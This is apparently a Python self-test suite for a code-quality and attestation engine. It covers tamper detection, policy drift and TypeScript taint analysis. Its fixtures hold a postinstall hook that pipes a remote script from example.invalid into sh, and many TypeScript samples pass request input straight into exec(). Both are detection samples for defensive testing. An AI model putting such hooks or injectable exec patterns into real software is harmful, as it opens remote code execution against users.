"""V28.4 adversarial verification-boundary self-tests."""
import copy, json, subprocess, sys, tempfile
from pathlib import Path
ROOT=Path(__file__).resolve().parents[1]
sys.path.insert(0,str(ROOT))



def main():
    from engine.verifier import att_digest, verify, _intrinsic_errors
    from engine.parsers import normalize
    from engine.run import safe_argv

    print('# Command policy is token-aware: dangerous actions are blocked, while', flush=True)
    # Command policy is token-aware: dangerous actions are blocked, while
    print('# harmless substrings in filenames/labels are not.', flush=True)
    # harmless substrings in filenames/labels are not.
    assert safe_argv(['pytest','tests/production-ready_test.py'])[0]
    assert safe_argv(['python','check_production.py'])[0]
    assert not safe_argv(['php','artisan','migrate:fresh'])[0]
    assert not safe_argv(['git','push','origin','main'])[0]
    assert not safe_argv(['npm','run','deploy'])[0]
    assert not safe_argv(['node','tool.js','--env=production'])[0]
    assert not safe_argv([])[0]
    with tempfile.TemporaryDirectory() as td:
        td=Path(td); repo=td/'repo'; repo.mkdir()
        (repo/'package.json').write_text('{"scripts":{"test":"true"}}\n')
        (repo/'main.py').write_text("print('ok')\n")
        (repo/'README.md').write_text('one\n')
        src=td/'source.json'
        rc=subprocess.run([sys.executable,str(ROOT/'bin'/'quality-run.py'),str(repo),str(src)],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,text=True,timeout=30)
        if rc.returncode!=0: raise AssertionError('quality-run-fixture-failed:'+rc.stdout+rc.stderr)
        fixture=json.loads(src.read_text())

        print('# 1) Rehashed semantic tampering must fail.', flush=True)
        # 1) Rehashed semantic tampering must fail.
        for field,value in [('decision','BLOCKED'),('finding_summary',{'total':999,'blocking':999,'advisory':0}),
                            ('failure_types',['FAKE']),('failures',[{'code':'FAKE','type':'TEST_FAILED','severity':'critical'}]),
                            ('errors',['fake-error']),('trust',{'level':'VERIFIED','integrity_verified':True})]:
            tampered=copy.deepcopy(fixture); tampered[field]=value; tampered['attestation_sha256']=att_digest(tampered)
            if not _intrinsic_errors(tampered): raise AssertionError('tamper-not-detected:'+field)

        print('# 2) VERIFIED requires an actual source, not merely a syntactically valid digest.', flush=True)
        # 2) VERIFIED requires an actual source, not merely a syntactically valid digest.
        verified=copy.deepcopy(fixture)
        verified['verification']={'status':'PASS','verified_at':'2026-01-01T00:00:00Z','verified_attestation_of':'1'*64}
        verified['trust']={'level':'VERIFIED','integrity_verified':True}
        verified['attestation_sha256']=att_digest(verified)
        vp=td/'verified.json'; vp.write_text(json.dumps(verified))
        assert 'verified-source-not-supplied' in verify(vp,repo)

        print('# 3) Forged source digest must fail even when a source file is supplied.', flush=True)
        # 3) Forged source digest must fail even when a source file is supplied.
        forged=copy.deepcopy(verified); forged['verification']['verified_attestation_of']='2'*64; forged['attestation_sha256']=att_digest(forged)
        fp=td/'forged.json'; fp.write_text(json.dumps(forged))
        assert 'verified-source-digest-mismatch' in verify(fp,repo,source_path=str(src))

        print('# 4) Bundled schema is mandatory even when CLI schema is omitted.', flush=True)
        # 4) Bundled schema is mandatory even when CLI schema is omitted.
        assert not verify(src,repo)

        print('# 5) Parent baseline identity A -> current identity B is valid lineage.', flush=True)
        # 5) Parent baseline identity A -> current identity B is valid lineage.
        parent=td/'parent.json'; parent.write_text(src.read_text())
        (repo/'README.md').write_text('two\n')
        child=td/'child.json'
        rc=subprocess.run([sys.executable,str(ROOT/'bin'/'quality-run.py'),str(repo),str(child),str(parent)],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,text=True,timeout=30)
        if rc.returncode!=0: raise AssertionError('child-run-failed:'+rc.stdout+rc.stderr)
        child_errors=verify(child,repo,parent_path=str(parent))
        if any(e=='parent-repository-identity-mismatch' for e in child_errors):
            raise AssertionError('legitimate-parent-current-identity-rejected')
        if child_errors: raise AssertionError('child-verification-failed:'+','.join(child_errors))

        print('# Restore the source repository so subsequent source-attestation checks', flush=True)
        # Restore the source repository so subsequent source-attestation checks
        print('# are not accidentally testing repository drift from the lineage case.', flush=True)
        # are not accidentally testing repository drift from the lineage case.
        (repo/'README.md').write_text('one\n')

        print('# 6) Malformed baseline with a valid outer digest must not be accepted.', flush=True)
        # 6) Malformed baseline with a valid outer digest must not be accepted.
        malformed=copy.deepcopy(fixture); malformed['complexity']={'malformed':True}; malformed['attestation_sha256']=att_digest(malformed)
        mp=td/'malformed.json'; mp.write_text(json.dumps(malformed))
        out=td/'out.json'; rc=subprocess.run([sys.executable,str(ROOT/'bin'/'quality-run.py'),str(repo),str(out),str(mp)],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,text=True,timeout=30)
        if rc.returncode==0: raise AssertionError('malformed-baseline-accepted')

        print('# 7) Live policy drift must invalidate verification, while the attested', flush=True)
        # 7) Live policy drift must invalidate verification, while the attested
        print('# policy remains the only policy used for intrinsic risk/decision math.', flush=True)
        # policy remains the only policy used for intrinsic risk/decision math.
        drifted=repo/'quality-gate.json'
        drifted.write_text(json.dumps({'version':'28.4.0','required':{'fail_closed':True,'baseline_for_pass':False},'risk_rules':{'medium':'CRITICAL'}}))
        drift_errors=verify(src,repo)
        assert 'policy-drift-since-attestation' in drift_errors,drift_errors
        drifted.unlink()
        assert not verify(src,repo)

        print('# 8) Policy source tampering is rejected even when the outer attestation', flush=True)
        # 8) Policy source tampering is rejected even when the outer attestation
        print('# digest is freshly recomputed.', flush=True)
        # digest is freshly recomputed.
        policy_tampered=copy.deepcopy(fixture)
        policy_tampered['policy']['sources'][0]['content']['risk_rules']['medium']='LOW'
        policy_tampered['attestation_sha256']=att_digest(policy_tampered)
        assert 'policy-source-content-digest-mismatch:'+str(policy_tampered['policy']['sources'][0]['path']) in _intrinsic_errors(policy_tampered)

        print('# 9) A policy bundle must prove source provenance; empty sources are invalid', flush=True)
        # 9) A policy bundle must prove source provenance; empty sources are invalid
        print('# even when the resolved policy digest and outer attestation digest are valid.', flush=True)
        # even when the resolved policy digest and outer attestation digest are valid.
        no_sources=copy.deepcopy(fixture)
        no_sources['policy']['sources']=[]
        no_sources['attestation_sha256']=att_digest(no_sources)
        no_source_errors=_intrinsic_errors(no_sources)
        assert 'policy-sources-empty' in no_source_errors or any('schema:' in e and 'minItems' in e for e in no_source_errors), no_source_errors

        print('# 10) Independent TSQ recomputation must reject forged source metrics', flush=True)
        # 10) Independent TSQ recomputation must reject forged source metrics
        print('# even when the outer attestation digest is freshly recomputed.', flush=True)
        # even when the outer attestation digest is freshly recomputed.
        tsq_forged=copy.deepcopy(fixture)
        tsq_forged['typescript_quality']['metrics']['lines']=int(tsq_forged['typescript_quality']['metrics'].get('lines',0))+1
        tsq_forged['attestation_sha256']=att_digest(tsq_forged)
        tfp=td/'tsq-forged.json'; tfp.write_text(json.dumps(tsq_forged))
        tsq_errors=verify(tfp,repo)
        assert 'typescript-quality-independent-metric-mismatch:lines' in tsq_errors, tsq_errors

        print('# 10) Exit-0 diagnostics are preserved; parser is explicitly generic.', flush=True)
        # 10) Exit-0 diagnostics are preserved; parser is explicitly generic.
        n=normalize('eslint','file.ts:1:2 warning no-unused-vars hi','',0)
        assert n['finding_count']==1 and n['parser_kind']=='structured-fallback' and n['implementation']=='structured-text-v28.4'
        native=normalize('eslint','[{"filePath":"x.ts","messages":[{"ruleId":"no-any","severity":2,"line":3,"column":4,"message":"bad"}]}]','',1)
        assert native['parser_kind']=='native' and native['finding_count']==1 and native['findings'][0]['rule']=='no-any'
        followup_regressions()


    print('V28.4 SEMANTIC SELF-TESTS PASS')


def followup_regressions():
    import tempfile, pathlib
    with tempfile.TemporaryDirectory() as td:
        td=pathlib.Path(td); root=td; (root/'node_modules/pkg').mkdir(parents=True); (root/'packages/lib').mkdir(parents=True)
        (root/'package.json').write_text(json.dumps({'workspaces':['packages/*']}))
        (root/'packages/lib/package.json').write_text(json.dumps({'name':'@demo/lib','exports':{'.':{'types':'./index.d.ts','import':'./index.js','default':'./index.js'}}}))
        (root/'packages/lib/index.d.ts').write_text('export declare function hi(x: string): number;')
        (root/'main.ts').write_text('import { hi } from "@demo/lib"; export function run(x: string): number { if (x) return hi(x); return 0; }')
        from engine.analysis import _ts_analysis, _resolve_ts_target, complexity, _api_index
        ti=_ts_analysis(root,[root/'main.ts']); assert 'main.ts' in ti and ti['main.ts'].get('backend')=='typescript-compiler-api',ti
        assert _resolve_ts_target(root,'main.ts','@demo/lib')=='packages/lib/index.d.ts'
        ci=complexity(root); assert ci['per_function']['main.ts'][0]['max_nesting']==1,ci
        assert _api_index(root)['main.ts'][0].startswith('run/1|string|number'),_api_index(root)
        print('# Conditional exports are authoritative; blocked subpaths must not fall back to main/index.', flush=True)
        # Conditional exports are authoritative; blocked subpaths must not fall back to main/index.
        assert _resolve_ts_target(root,'main.ts','@demo/lib/private')=='@demo/lib/private'
        print('# Python nesting is AST-derived, independent of four-space indentation.', flush=True)
        # Python nesting is AST-derived, independent of four-space indentation.
        (root/'nested.py').write_text('def f(x):\n  if x:\n    for y in x:\n      return y\n  return None\n')
        assert complexity(root)['per_function']['nested.py'][0]['complexity']>=2
        print('# API signature changes are visible even when arity is unchanged.', flush=True)
        # API signature changes are visible even when arity is unchanged.
        (root/'api.py').write_text('def public(x: str) -> int:\n  return 1\n')
        a1=_api_index(root)['api.py'][0]
        (root/'api.py').write_text('def public(x: int) -> int:\n  return 1\n')
        a2=_api_index(root)['api.py'][0]
        assert a1!=a2,(a1,a2)
        print('# Composer native analyzers force machine-readable formats.', flush=True)
        # Composer native analyzers force machine-readable formats.
        from engine.adapters import adapter_commands
        (root/'composer.json').write_text(json.dumps({'scripts':{'phpstan':'phpstan analyse','phpcs':'phpcs'}}))
        cmds={x['name']:x for x in adapter_commands(root)}
        assert '--error-format=json' in cmds['phpstan']['argv']
        assert '--report=json' in cmds['phpcs']['argv']
        print('# Native JSON parsing must ignore non-JSON stderr chatter.', flush=True)
        # Native JSON parsing must ignore non-JSON stderr chatter.
        from engine.parsers import normalize
        parsed=normalize('eslint','[]','warning: config loaded',0)
        assert parsed['parser_kind']=='native' and parsed['parse_status']=='COMPLETE',parsed
        print('# Private/protected TS members are not part of the public API, while public', flush=True)
        # Private/protected TS members are not part of the public API, while public
        print('# member type/optionality changes are represented structurally.', flush=True)
        # member type/optionality changes are represented structurally.
        (root/'public.ts').write_text('export class A { private secret(x: string): number { return 1 } protected mid(x: string): number { return 1 } public ok(x?: string): number { return 1 } }\n')
        api=_api_index(root)['public.ts']
        assert any(x.startswith('A|') for x in api),api
        assert not any('secret/' in x or 'mid/' in x for x in api),api
        assert any('ok(' in x and 'x?:string' in x for x in api),api
        print('# Cargo emits JSON Lines, not one JSON document. Native parser must retain diagnostics.', flush=True)
        # Cargo emits JSON Lines, not one JSON document. Native parser must retain diagnostics.
        cargo='''{"reason":"compiler-message","message":{"level":"error","message":"bad","code":{"code":"E1"},"spans":[{"file_name":"x.rs","line_start":2,"column_start":3,"is_primary":true}]}}\n{"reason":"build-finished","success":false}\n'''
        cp=normalize('cargo-json',cargo,'',1)
        assert cp['parser_kind']=='native' and cp['finding_count']==1 and cp['parse_status']=='COMPLETE',cp
        print('# Exported arrow/function expressions inherit the variable binding as their API name.', flush=True)
        # Exported arrow/function expressions inherit the variable binding as their API name.
        (root/'arrow.ts').write_text('export const foo = (x?: string): number => x ? x.length : 0;\nexport const bar = function (x: number): string { return String(x); };\n')
        arrow_api=_api_index(root)['arrow.ts']
        assert any(x.startswith('foo/1') for x in arrow_api),arrow_api
        assert any(x.startswith('bar/1') for x in arrow_api),arrow_api
        assert not any(x.startswith('<anonymous>') for x in arrow_api),arrow_api
        print('# A nested tsconfig/extends change invalidates the shared TS analysis cache.', flush=True)
        # A nested tsconfig/extends change invalidates the shared TS analysis cache.
        (root/'packages/lib/tsconfig.json').write_text(json.dumps({'compilerOptions':{'baseUrl':'./src'}}))
        first=_ts_analysis(root,[root/'main.ts'])
        before=len(__import__('engine.analysis',fromlist=['_TS_CACHE'])._TS_CACHE)
        (root/'packages/lib/tsconfig.json').write_text(json.dumps({'compilerOptions':{'baseUrl':'./other'}}))
        second=_ts_analysis(root,[root/'main.ts'])
        assert len(__import__('engine.analysis',fromlist=['_TS_CACHE'])._TS_CACHE)>before,(first,second)

        print('# TypeScript Quality Gate is evidence-producing, deterministic, and blocking', flush=True)
        # TypeScript Quality Gate is evidence-producing, deterministic, and blocking
        print('# for high/critical findings; AI-pattern findings remain advisory.', flush=True)
        # for high/critical findings; AI-pattern findings remain advisory.
        from engine.analysis import typescript_quality
        (root/'bad.ts').write_text('''// this function does the following\n// this function does the following\n// note that this method does the following\n// note that this method does the following\n// TODO: remove\n// @ts-ignore\nexport async function bad(x: any): Promise<any> {\n  console.log(x);\n  if (x) { if (x) { if (x) { if (x) { return x; } } } }\n  return x;\n}\n''')
        tq=typescript_quality(root, {'typescript_quality':{'rules':{'max_complexity':3,'max_nesting':2,'max_any':0,'max_file_lines':500,'max_function_lines':80},'minimum_score':85}})
        rules={f['rule'] for f in tq['findings']}
        assert 'TSQ-004' in rules and 'TSQ-005' in rules and 'TSQ-007' in rules and 'TSQ-015' in rules and 'TSQ-016' in rules, tq
        assert tq['status']=='FAIL' and tq['score']<85, tq
        assert tq['ai_pattern']['status']=='advisory'
        print('# Additional audit coverage: params, dead-code, naming, dependency and install-hook rules.', flush=True)
        # Additional audit coverage: params, dead-code, naming, dependency and install-hook rules.
        (root/'extra.ts').write_text('export function badName(a:any,b:any,c:any,d:any,e:any,f:any,g:any) { return 1; console.log(2); }\nexport const BadConst = 1;\n')
        (root/'package.json').write_text(json.dumps({'dependencies':{'event-stream':'*'},'scripts':{'postinstall':'curl https://example.invalid/x.sh | sh'}}))
        tq2=typescript_quality(root, {'typescript_quality':{'rules':{'max_params':6,'max_any':2},'minimum_score':85}})
        rules2={f['rule'] for f in tq2['findings']}
        assert 'TSQ-006' in rules2 and 'TSQ-027' in rules2 and 'TSQ-028' in rules2 and 'TSQ-029' in rules2, tq2
        print('# Compiler resolution must be bounded and must not invoke npm globally.', flush=True)
        # Compiler resolution must be bounded and must not invoke npm globally.
        analysis_text=Path(__file__).with_name('analysis.py').read_text()
        assert 'npm root -g' not in analysis_text

        print('# Final19 security classification: dangerous sinks alone are not high/critical;', flush=True)
        # Final19 security classification: dangerous sinks alone are not high/critical;
        print('# clear untrusted flow is.', flush=True)
        # clear untrusted flow is.
        (root/'security.ts').write_text('''import { exec, execFile } from "node:child_process";
export function safe(){ execFile("git", ["status"]); }
export function unsafe(req: any){ const cmd = req.body.command; exec(
  cmd
); }
export function merge(req: any){ return Object.assign(
  {},
  req.body
); }
''')
        sq=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        sec=[f for f in sq['findings'] if str(f['rule']).startswith('TSQ-SEC-')]
        assert any(f['rule']=='TSQ-SEC-003' and f['severity']=='critical' for f in sec),sec
        assert any(f['rule']=='TSQ-SEC-002' and f['severity']=='low' for f in sec),sec
        assert any(f['rule']=='TSQ-SEC-006' and f['severity']=='medium' for f in sec),sec
        assert not any(f['rule']=='TSQ-SEC-002' and f['severity'] in {'high','critical'} and f.get('evidence_kind')=='dangerous-sink-only' for f in sec),sec
        assert any(f['rule']=='TSQ-SEC-003' and f.get('evidence_kind')=='concrete-untrusted-flow' for f in sec),sec
        assert any(f['rule']=='TSQ-SEC-006' and f['severity']=='medium' and f.get('evidence_kind')=='untrusted-object-merge' for f in sec),sec
        print('# Final21 adversarial bounded data-flow: destructuring, parameter propagation, and cross-function flow.', flush=True)
        # Final21 adversarial bounded data-flow: destructuring, parameter propagation, and cross-function flow.
        (root/'flow.ts').write_text("""const direct = (req: any) => { const { command } = req.body; exec(command); };
function run(command: string) { exec(command); }
export function cross(req: any) { const cmd = req.body.command; run(cmd); }
""")
        fq=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        fsec=[f for f in fq['findings'] if str(f['rule']).startswith('TSQ-SEC-')]
        assert any(f['rule']=='TSQ-SEC-003' and f['severity']=='critical' and f.get('evidence_kind')=='concrete-untrusted-flow' for f in fsec), fsec
        assert any(f.get('function')=='run' and f.get('parameter_index')==0 for f in fsec), fsec
        (root/'safe-flow.ts').write_text("function runSafe(command: string) { exec(command); }\nrunSafe(\"git status\");\n")
        safeq=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        ssec=[f for f in safeq['findings'] if str(f['rule']).startswith('TSQ-SEC-') and f.get('function')=='runSafe']
        assert not any(f['severity']=='critical' for f in ssec), ssec
        print('# Final25 adversarial coverage: object spread/property flow, class methods,', flush=True)
        # Final25 adversarial coverage: object spread/property flow, class methods,
        print('# default parameters, and imported re-export aliases. These remain bounded.', flush=True)
        # default parameters, and imported re-export aliases. These remain bounded.
        (root/'advanced-flow.ts').write_text("""import { run as execute } from './reexport';
class Runner {
  run(command = 'safe') { exec(command); }
}
export function advanced(req: any) {
  const obj = { ...req.body };
  const x = obj.command;
  new Runner().run(x);
  execute(obj.command);
}
""")
        (root/'reexport.ts').write_text("export { run } from './sink';\n")
        (root/'sink.ts').write_text("export function run(command: string) { exec(command); }\n")
        aq=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        asec=[f for f in aq['findings'] if str(f['rule']).startswith('TSQ-SEC-')]
        assert any(f['rule']=='TSQ-SEC-003' and f['severity']=='critical' for f in asec), asec
        print('# Final30: return-value propagation from a tainted argument into a sink.', flush=True)
        # Final30: return-value propagation from a tainted argument into a sink.
        (root/'return-flow.ts').write_text("function get(command: string) { return command; }\nexport function returned(req: any) { const value = get(req.body.command); exec(value); }\n")
        rq=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        rsec=[f for f in rq['findings'] if str(f['rule']).startswith('TSQ-SEC-') and f.get('path')=='return-flow.ts']
        assert any(f['rule']=='TSQ-SEC-003' and f['severity']=='critical' and f.get('evidence_kind')=='concrete-untrusted-flow' for f in rsec), rsec
        print('# Final31 adversarial coverage: async/Promise return-value propagation and method returns.', flush=True)
        # Final31 adversarial coverage: async/Promise return-value propagation and method returns.
        (root/'async-return-flow.ts').write_text("async function get(command: string): Promise<string> { return command; }\nclass Runner { async get(command: string) { return command; } }\nexport async function f(req: any) { const a = await get(req.body.command); exec(a); const b = await new Runner().get(req.body.command); exec(b); }\n")
        arq=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        arsec=[f for f in arq['findings'] if str(f['rule']).startswith('TSQ-SEC-') and f.get('path')=='async-return-flow.ts']
        assert any(f['severity']=='critical' and f.get('evidence_kind')=='concrete-untrusted-flow' for f in arsec), arsec

        print('# Final32 adversarial coverage: Promise.then callback flow and object-return propagation.', flush=True)
        # Final32 adversarial coverage: Promise.then callback flow and object-return propagation.
        (root/'final32-flow.ts').write_text("""async function getObj(command: string) { return { command }; }
export async function f(req: any) {
  const p = Promise.resolve(req.body.command);
  p.then(v => exec(v));
  const obj = await getObj(req.body.command);
  exec(obj.command);
}
""")
        f32q=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        f32sec=[f for f in f32q['findings'] if str(f['rule']).startswith('TSQ-SEC-') and f.get('path')=='final32-flow.ts']
        assert any(f['severity']=='critical' and f.get('sink')=='promise-callback-parameter' for f in f32sec), f32sec
        assert any(f['severity']=='critical' and f.get('sink')=='object-return-property' for f in f32sec), f32sec

        print('# Final36 adversarial coverage: no generic parameter taint when the sink is unrelated.', flush=True)
        # Final36 adversarial coverage: no generic parameter taint when the sink is unrelated.
        (root/'param-negative.ts').write_text("function unrelated(req: any) { console.log(req.body.x); Promise.resolve('safe').then(v => exec(v)); }\nfunction direct(req: any) { exec(req.body.command); }\n")
        out=td/'param-negative.json'; rc=subprocess.run([sys.executable,str(ROOT/'bin'/'quality-run.py'),str(root),str(out)],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,text=True,timeout=30); assert rc.returncode in (0,2), rc.returncode
        d=json.load(open(out)); sec=[f for f in d.get('typescript_quality',{}).get('findings',[]) if f.get('rule')=='TSQ-SEC-003']
        assert not any(f.get('sink')=='function-parameter' and f.get('function')=='unrelated' for f in sec), sec
        assert any(f.get('function')=='direct' and f.get('severity')=='critical' for f in sec), sec

        print('# Final35 adversarial coverage: Promise chain/rejection/finally semantics and cross-file class method flow.', flush=True)
        # Final35 adversarial coverage: Promise chain/rejection/finally semantics and cross-file class method flow.
        (root/'final35-promise.ts').write_text("""export function flow(req: any) {
  Promise.resolve(req.body.command).then(v => v).then(v => exec(v));
  Promise.reject(req.body.command).catch(v => exec(v));
  Promise.resolve(req.body.command).finally(() => exec("safe"));
  Promise.resolve("safe").then(v => exec(v));
}
function unrelated(req: any) {
  console.log(req.body.x);
  Promise.resolve("safe").then(v => exec(v));
}
""")
        q35=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        s35=[f for f in q35['findings'] if str(f['rule']).startswith('TSQ-SEC-') and f.get('path')=='final35-promise.ts']
        assert any(f.get('sink')=='promise-chain-parameter' and f.get('stage')=='then' and f.get('severity')=='critical' for f in s35), s35
        assert any(f.get('sink')=='promise-chain-parameter' and f.get('stage')=='catch' and f.get('severity')=='critical' for f in s35), s35
        assert not any(f.get('sink')=='promise-chain-parameter' and f.get('stage')=='finally' for f in s35), s35
        assert not any(f.get('function')=='unrelated' and f.get('severity')=='critical' for f in s35), s35
        (root/'final35-class-lib.ts').write_text("export class Runner { run(command: string) { exec(command); } }\n")
        (root/'final35-class-main.ts').write_text("import { Runner } from './final35-class-lib';\nexport function go(req: any) { const x=req.body.command; new Runner().run(x); }\n")
        c35=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        cs35=[f for f in c35['findings'] if str(f['rule']).startswith('TSQ-SEC-') and f.get('path')=='final35-class-main.ts']
        assert any(f.get('sink')=='cross-file-class-method' and f.get('severity')=='critical' for f in cs35), cs35

        print('# The TypeChecker reference matcher must rely on symbol identity only.', flush=True)
        # The TypeChecker reference matcher must rely on symbol identity only.
        analysis_text=Path(__file__).with_name('analysis.py').read_text()
        assert 's2.flags===symbol.flags' not in analysis_text and 's2.name===symbol.name' not in analysis_text

        print('# Constant default must not become an untrusted flow by itself.', flush=True)
        # Constant default must not become an untrusted flow by itself.
        (root/'default-safe.ts').write_text("function run(command = 'git status') { exec(command); }\nrun();\n")
        dq=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        dsec=[f for f in dq['findings'] if str(f['rule']).startswith('TSQ-SEC-') and f.get('function')=='run' and f.get('path')=='default-safe.ts']
        assert not any(f['severity']=='critical' for f in dsec), dsec

        print('# Final22: bounded multi-hop same-file propagation and nested destructuring.', flush=True)
        # Final22: bounded multi-hop same-file propagation and nested destructuring.
        (root/'flow-chain.ts').write_text("function sink(command: string) { exec(command); }\nfunction mid(command: string) { sink(command); }\nfunction top(command: string) { mid(command); }\nexport function chained(req: any) { const { body: { command } } = req; top(command); }\n")
        cq=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        csec=[f for f in cq['findings'] if str(f['rule']).startswith('TSQ-SEC-')]
        assert any(f.get('function')=='sink' and f.get('parameter_index')==0 for f in csec), csec
        assert any(f.get('function')=='mid' and f.get('parameter_index')==0 for f in csec), csec
        assert any(f.get('function')=='top' and f.get('parameter_index')==0 for f in csec), csec

        print('# Final26 adversarial coverage: destructured function parameters and class methods.', flush=True)
        # Final26 adversarial coverage: destructured function parameters and class methods.
        (root/'final26-flow.ts').write_text("""function sink({command}: {command: string}) { exec(command); }
class Base { run(command: string) { exec(command); } }
class Child extends Base {}
export function f(req: any) { sink(req.body); new Child().run(req.body.command); }
""")
        f26q=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        f26sec=[f for f in f26q['findings'] if str(f['rule']).startswith('TSQ-SEC-')]
        assert any(f['severity']=='critical' and f.get('function')=='sink' for f in f26sec), f26sec
        assert any(f['severity']=='critical' and f.get('function')=='run' for f in f26sec), f26sec

        print('# Final27 adversarial coverage: computed properties, arrays, nested callbacks,', flush=True)
        # Final27 adversarial coverage: computed properties, arrays, nested callbacks,
        print('# default/destructured parameters, and cross-file re-export/import aliases.', flush=True)
        # default/destructured parameters, and cross-file re-export/import aliases.
        (root/'final27-flow.ts').write_text('''import { execute as run } from "./reexport";
export function flow(req: any) {
  const obj = { command: req.body.command };
  const copy = { ...obj };
  const arr = [copy.command];
  const { command: alias } = copy;
  const x = arr[0];
  [x].forEach(v => run(v));
  return alias;
}
''')
        (root/'sink27.ts').write_text('''import { exec } from "node:child_process";
export function execute(command: string = "git status") { exec(command); }
''')
        (root/'reexport.ts').write_text('''export { execute } from "./sink27";
''')
        q27=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        sec27=[f for f in q27['findings'] if str(f['rule']).startswith('TSQ-SEC-')]
        assert any(f['severity']=='critical' and f.get('sink') in {'cross-file-import-alias','function-parameter','callback-parameter'} for f in sec27),sec27
        assert not any(f.get('severity')=='critical' and f.get('function')=='execute' and f.get('evidence_kind')=='dangerous-sink-only' for f in sec27),sec27
        print('# Final34: request-like parameters must not taint unrelated sinks, while direct', flush=True)
        # Final34: request-like parameters must not taint unrelated sinks, while direct
        print('# request-property-to-sink flow remains concrete. Keep both in one compiler run.', flush=True)
        # request-property-to-sink flow remains concrete. Keep both in one compiler run.
        (root/'final34-flow.ts').write_text('''function unrelated(req: any) {
  console.log(req.body.x);
  Promise.resolve(\"safe\").then(v => exec(v));
}
function direct(req: any) {
  exec(req.body.command);
}
''')
        q34=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        sec34=[f for f in q34['findings'] if str(f['rule']).startswith('TSQ-SEC-') and f.get('path')=='final34-flow.ts']
        assert not any(f.get('sink')=='function-parameter' and f.get('function')=='unrelated' for f in sec34),sec34
        assert any(f.get('sink')=='function-parameter' and f.get('function')=='direct' and f.get('severity')=='critical' for f in sec34),sec34

        print('# TypeChecker-backed unused import evidence.', flush=True)
        # TypeChecker-backed unused import evidence.
        (root/'imports.ts').write_text('import { hi } from "@demo/lib"; import { join } from "node:path"; export const x = 1;')
        iq=typescript_quality(root, {'typescript_quality':{'minimum_score':85}})
        assert any(f['rule']=='TSQ-021' and f.get('backend')=='typescript-typechecker' for f in iq['findings']),iq

        print('# Project model: package-manager declaration and workspace containers are handled', flush=True)
        # Project model: package-manager declaration and workspace containers are handled
        print('# without falsely treating the monorepo `packages/` container as a source root.', flush=True)
        # without falsely treating the monorepo `packages/` container as a source root.
        from engine.project_model import build_project_model
        (root/'package.json').write_text(json.dumps({'packageManager':'pnpm@9.0.0','workspaces':['packages/*'],'scripts':{'build':'tsc -b'}}))
        pm=build_project_model(root)
        assert pm['package_manager']=='pnpm',pm
        assert 'packages' not in pm['source_roots'],pm
        assert 'packages' not in pm['source_roots'],pm
        (root/'pnpm-workspace.yaml').write_text('packages:\n  - packages/*\n  - \"apps/*\"\n  - !packages/legacy\n')
        for d in ('packages/a','packages/legacy','apps/web'):
            (root/d).mkdir(parents=True,exist_ok=True); (root/d/'package.json').write_text('{}')
        pm2=build_project_model(root)
        assert 'packages/legacy' not in pm2.get('workspace_dirs',[]),pm2


if __name__=='__main__': main()
